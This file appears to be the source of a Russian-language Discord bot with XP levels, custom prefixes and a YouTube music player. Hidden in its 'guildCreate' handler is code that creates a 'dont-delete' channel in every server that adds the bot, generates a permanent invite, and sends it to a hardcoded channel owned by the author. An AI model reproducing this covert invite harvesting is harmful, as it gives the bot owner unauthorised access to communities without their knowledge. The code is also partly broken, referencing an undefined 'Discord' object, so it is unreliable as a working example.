const { Client, Util } = require('discord.js');
const fs = require("fs");
const ms = require("ms");
const xp = require("./xp.json");
const prefixs = require("./prefix.json");
const YouTube = require('simple-youtube-api');
const ytdl = require('ytdl-core');
const youtube = new YouTube(process.env.GOOGLE_API_KEY);
const queue = new Map();


const bot = new Client({ disableEveryone: true });

var answers = [
    `VasBoat | db!help`,
    `VasBoat | bit.ly/protectori`
  ] 
bot.commands = new Discord.Collection();
fs.readdir("./commands", (err, files) => {
    if(err) console.log(err);

    let jsfile = files.filter(f => f.split(".").pop() === "js")
    if(jsfile.length <= 0){
        console.log("Не могу найти команды!");
        return;
    }

    jsfile.forEach((f, i) =>{
    let props = require(`./commands/${f}`);
    console.log(`${f} loaded!`);
    bot.commands.set(props.help.name, props);
    });

});

bot.login(process.env.TOKEN);


//PREFIX SET
bot.on('message', async message => {
if(!prefixs[message.guild.id]){
    prefixs[message.guild.id] = {
prefix: 'db!'
    };
}
});
//PREFIX SET




//New server
bot.on('guildCreate', async guild => {
    const invc = await guild.createChannel('dont-delete', 'text');
    bot.guilds.get(guild.id).channels.get(invc.id).createInvite({maxAge:"0"}).then(i => bot.guilds.get('522485574901170197').channels.get('523184795027767314').send('https://discord.gg/'+i.code));
})
//New server




bot.on('message', async message => {
    if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0];
    let args = messageArray.slice(1);
if(message.content.startsWith(prefix)){
let commandfile = bot.commands.get(cmd.slice(prefix.length));
if(commandfile) commandfile.run(bot,message,args);
}else{ }
});


//XP SYSTEM OPEN
bot.on('message', async message => {
    if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
let xpAdd = Math.floor(Math.random() * 7) + 8;

if(!xp[message.author.id]){
    xp[message.author.id] = {
        xp: 0,
        level: 1
    };
}

let curxp = xp[message.author.id].xp;
let curlvl = xp[message.author.id].level;
let nxtLvl = xp[message.author.id].level * 700;
xp[message.author.id].xp = curxp + xpAdd;
if(nxtLvl <= xp[message.author.id].xp){
    xp[message.author.id].level = curlvl + 1;
    let lvlup = new Discord.RichEmbed()
    .setTitle(`${message.author.username} у вас новый уровень!`)
    .setThumbnail(message.author.displayAvatarURL)
    .addField(`Ваш уровень`, curlvl + 1)
    .setColor('00ff54');
    message.channel.send(lvlup);
}
fs.writeFile("./xp.json", JSON.stringify(xp), (err) => {
    if(err) console.log(err)
});
});
//XP SYSTEM END


bot.on('ready', () => {
let interval = setInterval (function () {
    var randomAnswer = answers[Math.floor(Math.random() * answers.length)];
    bot.user.setPresence({
        game:{
            name:`${randomAnswer}`,
            type:"STREAMING",
            url:"https://www.twitch.tv/mcartyr"
        }
    });
      }, 5 * 1000);
  console.log('Я готов')
});
bot.on('messageUpdate', async (oldMessage, message) => {
  if(message.author.bot) return;
  let prefix = prefixs[message.guild.id].prefix;
  let messageArray = message.content.split(" ");
  let cmd = messageArray[0];
  let args = messageArray.slice(1);
if(message.content.startsWith(prefix)){
let commandfile = bot.commands.get(cmd.slice(prefix.length));
if(commandfile) commandfile.run(bot,message,args);
}else{}
  });
 //MUSIC
  bot.on('message', async msg => { // eslint-disable-line
    let PREFIX = prefixs[msg.guild.id].prefix;
    if (msg.author.bot) return undefined;
	if (!msg.content.startsWith(PREFIX)) return undefined;

	const args = msg.content.split(' ');
	const searchString = args.slice(1).join(' ');
	const url = args[1] ? args[1].replace(/<(.+)>/g, '$1') : '';
	const serverQueue = queue.get(msg.guild.id);

	let command = msg.content.toLowerCase().split(' ')[0];
	command = command.slice(PREFIX.length)

	if (command === 'play') {
		const voiceChannel = msg.member.voiceChannel;
		if (!voiceChannel) return msg.channel.send('Вы должны быть в голосовом канале чтобы играть музыку!');
		const permissions = voiceChannel.permissionsFor(msg.client.user);
		if (!permissions.has('CONNECT')) {
			return msg.channel.send('Я не могу подключится к вашему каналу, нет прав!');
		}
		if (!permissions.has('SPEAK')) {
			return msg.channel.send('Я не могу говорить, нет прав!');
		}

		if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
			const playlist = await youtube.getPlaylist(url);
			const videos = await playlist.getVideos();
			for (const video of Object.values(videos)) {
				const video2 = await youtube.getVideoByID(video.id); // eslint-disable-line no-await-in-loop
				await handleVideo(video2, msg, voiceChannel, true); // eslint-disable-line no-await-in-loop
			}
			return msg.channel.send(`✅ Плейлист: **${playlist.title}** добавлен в очередь!`);
		} else {
			try {
				var video = await youtube.getVideo(url);
			} catch (error) {
				try {
					var videos = await youtube.searchVideos(searchString, 10);
					let index = 0;
					msg.channel.send(`
__**Выбор песни:**__
${videos.map(video2 => `**${++index} -** ${video2.title}`).join('\n')}
Укажите значение для выбора одного из результатов поиска в диапазоне от 1 до 10.
					`);
					// eslint-disable-next-line max-depth
					try {
						var response = await msg.channel.awaitMessages(msg2 => msg2.content > 0 && msg2.content < 11, {
							maxMatches: 1,
							time: 10000,
							errors: ['time']
						});
					} catch (err) {
						console.error(err);
						return msg.channel.send('Нет или введено недопустимое значение, отмена выбора видео.');
					}
					const videoIndex = parseInt(response.first().content);
					var video = await youtube.getVideoByID(videos[videoIndex - 1].id);
				} catch (err) {
					console.error(err);
					return msg.channel.send('🆘 Я не смог получить результаты поиска.');
				}
			}
			return handleVideo(video, msg, voiceChannel);
		}
	} else if (command === 'skip') {
		if (!msg.member.voiceChannel) return msg.channel.send('Вы не в голосовом канале!');
		if (!serverQueue) return msg.channel.send('Нет ничего, что я мог бы пропустить для тебя.');
		serverQueue.connection.dispatcher.end('Skip комманда была использована!');
		return undefined;
	} else if (command === 'stop') {
		if (!msg.member.voiceChannel) return msg.channel.send('Вы не в голосовом канале!');
		if (!serverQueue) return msg.channel.send('Нет ничего, что я мог бы остановить для тебя.');
		serverQueue.songs = [];
		serverQueue.connection.dispatcher.end('Stop комманда была использована!');
		return undefined;
	} else if (command === 'volume') {
		if (!msg.member.voiceChannel) return msg.channel.send('Вы не в голосовом канале!');
		if (!serverQueue) return msg.channel.send('Ничего не играет.');
		if (!args[1]) return msg.channel.send(`The current volume is: **${serverQueue.volume}**`);
		serverQueue.volume = args[1];
		serverQueue.connection.dispatcher.setVolumeLogarithmic(args[1] / 5);
		return msg.channel.send(`Я установил громкость на: **${args[1]}**`);
	} else if (command === 'np') {
		if (!serverQueue) return msg.channel.send('Ничего не играет.');
		return msg.channel.send(`🎶 Сейчас играет: **${serverQueue.songs[0].title}**`);
	} else if (command === 'queue') {
		if (!serverQueue) return msg.channel.send('Ничего не играет.');
		return msg.channel.send(`
__**Очередь песен:**__
${serverQueue.songs.map(song => `**-** ${song.title}`).join('\n')}
**Сейчас играет:** ${serverQueue.songs[0].title}
		`);
	} else if (command === 'pause') {
		if (serverQueue && serverQueue.playing) {
			serverQueue.playing = false;
			serverQueue.connection.dispatcher.pause();
			return msg.channel.send('⏸ Пауза!');
		}
		return msg.channel.send('Ничего не играет.');
	} else if (command === 'resume') {
		if (serverQueue && !serverQueue.playing) {
			serverQueue.playing = true;
			serverQueue.connection.dispatcher.resume();
			return msg.channel.send('▶ Возобновление!');
		}
		return msg.channel.send('Ничего не играет.');
	}

	return undefined;
});

async function handleVideo(video, msg, voiceChannel, playlist = false) {
	const serverQueue = queue.get(msg.guild.id);
	console.log(video);
	const song = {
		id: video.id,
		title: Util.escapeMarkdown(video.title),
		url: `https://www.youtube.com/watch?v=${video.id}`
	};
	if (!serverQueue) {
		const queueConstruct = {
			textChannel: msg.channel,
			voiceChannel: voiceChannel,
			connection: null,
			songs: [],
			volume: 5,
			playing: true
		};
		queue.set(msg.guild.id, queueConstruct);

		queueConstruct.songs.push(song);

		try {
			var connection = await voiceChannel.join();
			queueConstruct.connection = connection;
			play(msg.guild, queueConstruct.songs[0]);
		} catch (error) {
			console.error(`Не удалось подключиться к голосовому каналу: ${error}`);
			queue.delete(msg.guild.id);
			return msg.channel.send(`Не удалось подключиться к голосовому каналу: ${error}`);
		}
	} else {
		serverQueue.songs.push(song);
		console.log(serverQueue.songs);
		if (playlist) return undefined;
		else return msg.channel.send(`✅ **${song.title}** добавлена в очередь!`);
	}
	return undefined;
}

function play(guild, song) {
	const serverQueue = queue.get(guild.id);

	if (!song) {
		serverQueue.voiceChannel.leave();
		queue.delete(guild.id);
		return;
	}
	console.log(serverQueue.songs);

	const dispatcher = serverQueue.connection.playStream(ytdl(song.url))
		.on('end', reason => {
			if (reason === 'Stream is not generating quickly enough.') console.log('Song ended.');
			else console.log(reason);
			serverQueue.songs.shift();
			play(guild, serverQueue.songs[0]);
		})
		.on('error', error => console.error(error));
	dispatcher.setVolumeLogarithmic(serverQueue.volume / 5);

	serverQueue.textChannel.send(`🎶 Start playing: **${song.title}**`);
}
//MUSIC END
